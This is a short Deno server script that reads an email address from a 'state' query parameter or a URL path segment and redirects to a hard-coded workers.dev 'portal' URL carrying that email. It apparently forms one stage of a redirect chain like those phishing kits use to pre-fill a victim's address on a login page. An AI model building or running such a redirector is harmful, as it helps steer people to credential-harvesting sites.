const PORT = Number(Deno.env.get("PORT") || 8080);

Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);

  const redirectBase =
    "https://portal1.internalwave.workers.dev/";

  let email = null;

  // 1) ?state=email@x.com  (from any upstream site)
  const state = url.searchParams.get("state");
  if (state) {
    try {
      const decoded = decodeURIComponent(state);
      if (decoded.includes("@") && !decoded.includes("/")) {
        email = decoded;
      }
    } catch {
      email = null;
    }
  }

  // 2) fallback: /email@x.com path segment
  if (!email) {
    const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
    if (path && path.includes("@") && !path.includes("/")) {
      try {
        email = decodeURIComponent(path);
      } catch {
        email = null;
      }
    }
  }

  // Must be ?state= — worker-cf.js reads searchParams.get('state')
  const redirectUrl = email
    ? redirectBase.replace(/\/+$/, "") + "?state=" + encodeURIComponent(email)
    : redirectBase;

  return Response.redirect(redirectUrl, 302);
});
